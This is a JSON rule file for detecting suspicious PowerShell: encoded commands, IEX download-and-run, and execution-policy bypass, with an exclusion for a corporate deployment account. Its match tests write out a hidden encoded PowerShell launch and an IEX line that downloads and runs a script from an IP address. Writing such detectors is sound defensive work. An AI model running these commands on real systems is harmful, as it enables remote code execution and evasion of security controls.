{
  "schema": 1,
  "name": "Suspicious PowerShell",
  "intent": "Encoded or downloading PowerShell, minus our software deployment account.",
  "join": "any",
  "ignore_case": true,
  "dot_matches_newline": false,
  "multiline": true,
  "anchor_start": false,
  "anchor_end": false,
  "scope": "line",
  "rules": [
    {
      "kind": "find",
      "pattern": "(?:powershell|pwsh)(?:\\.exe)?[^\\n]{0,200}?-(?:e|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\\b\\s+[A-Za-z0-9+/=]{20,}",
      "label": "encoded powershell command",
      "literal": false,
      "whole_word": false,
      "capture": false,
      "capture_name": "",
      "ignore_case": true,
      "enabled": true,
      "repeat": {
        "mode": "once",
        "minimum": 1,
        "maximum": 1,
        "greedy": true
      },
      "note": "PowerShell accepts any unambiguous prefix, which is why the alternation is long. Case and whitespace vary too.",
      "source": "powershell_encoded"
    },
    {
      "kind": "find",
      "pattern": "(?:IEX|Invoke-Expression)\\s*\\(?\\s*(?:New-Object\\s+Net\\.WebClient|iwr|curl|Invoke-WebRequest)",
      "label": "download-and-run",
      "literal": false,
      "whole_word": false,
      "capture": false,
      "capture_name": "",
      "ignore_case": null,
      "enabled": true,
      "repeat": {
        "mode": "once",
        "minimum": 1,
        "maximum": 1,
        "greedy": true
      },
      "note": "",
      "source": ""
    },
    {
      "kind": "find",
      "pattern": "-(?:ep|exec(?:utionpolicy)?)\\s+bypass",
      "label": "an execution-policy bypass",
      "literal": false,
      "whole_word": false,
      "capture": false,
      "capture_name": "",
      "ignore_case": null,
      "enabled": true,
      "repeat": {
        "mode": "once",
        "minimum": 1,
        "maximum": 1,
        "greedy": true
      },
      "note": "",
      "source": ""
    },
    {
      "kind": "exclude",
      "pattern": "CORP\\\\svc_deploy",
      "label": "our deployment account",
      "literal": false,
      "whole_word": false,
      "capture": false,
      "capture_name": "",
      "ignore_case": null,
      "enabled": true,
      "repeat": {
        "mode": "once",
        "minimum": 1,
        "maximum": 1,
        "greedy": true
      },
      "note": "",
      "source": ""
    }
  ],
  "proof": [
    {
      "text": "powershell.exe -NoP -W hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
      "expect": "should_match",
      "note": ""
    },
    {
      "text": "powershell -ExecutionPolicy Bypass -File x.ps1",
      "expect": "should_match",
      "note": ""
    },
    {
      "text": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')",
      "expect": "should_match",
      "note": ""
    },
    {
      "text": "powershell.exe -File C:\\Scripts\\report.ps1",
      "expect": "should_not_match",
      "note": ""
    }
  ],
  "sample": "windows"
}
